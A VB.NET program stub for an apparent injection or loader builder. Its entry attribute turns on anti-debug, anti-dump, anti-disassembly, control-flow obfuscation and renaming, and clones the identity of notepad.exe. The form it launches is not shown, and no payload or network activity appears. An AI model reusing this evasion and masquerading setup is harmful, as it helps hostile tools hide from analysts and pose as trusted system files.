Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Threading

<AttributeUsage(AttributeTargets.Method)>
Public Class InjectionEntryPoint
    Inherits Attribute

    Public Property CreateThread As Boolean = True
    Public Property BuildTarget As String = ".dll"
    Public Property MergeLibs As Boolean = False
    Public Property ILoader As Boolean = False
    Public Property ProtectionRules As String = String.Empty
    Public Property ILoaderProtectionRules As String = String.Empty
    Public Property PreCompiler As String = String.Empty
    Public Property CloneTo As String = String.Empty
    Public Property BasicILoaderProtection As Boolean = False

End Class

'<Obfuscation(Exclude:=False, Feature:="namespace('Hidrocapital_Dump'):-rename")>
'<Obfuscation(Exclude:=False, Feature:="constants")>
Public Class Program

    <System.Runtime.InteropServices.DllImport("user32.dll")>
    Private Shared Function SetProcessDPIAware() As Boolean
    End Function

    <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)>
    Private Shared Function FreeConsole() As Boolean
    End Function


    <InjectionEntryPoint(MergeLibs:=True, CreateThread:=True, BuildTarget:=".exe", ILoader:=True, ProtectionRules:="

      <rule pattern=""true"" preset=""none"" inherit=""false"">
         <protection id=""anti ildasm"" />
        <!--  <protection id=""anti tamper"" />  -->
         <!--   <protection id=""constants"" /> -->
         <protection id=""ctrl flow"" />
         <protection id=""anti dump"" /> 
         <protection id=""anti debug"" />
         <protection id=""invalid metadata"" />
         <!--  <protection id=""ref proxy"" /> -->
         <protection id=""resources"" />
         <protection id=""rename"" />
      </rule>

    ", BasicILoaderProtection:=True, CloneTo:="C:\Windows\notepad.exe")>
    <STAThread>
    Public Shared Sub Main()
        FreeConsole()
        MsgBox("hola perras")
        Dim Runtime As Boolean = True
        Dim t As Thread = New Thread(Sub()
                                         Application.EnableVisualStyles()
                                         Application.SetCompatibleTextRenderingDefault(False)

                                         SetProcessDPIAware()

                                         Application.Run(New Form1)
                                         Runtime = False
                                     End Sub)

        t.SetApartmentState(ApartmentState.STA)
        t.Start()

        Do While (Runtime) : Loop
        Environment.Exit(0)
    End Sub




End Class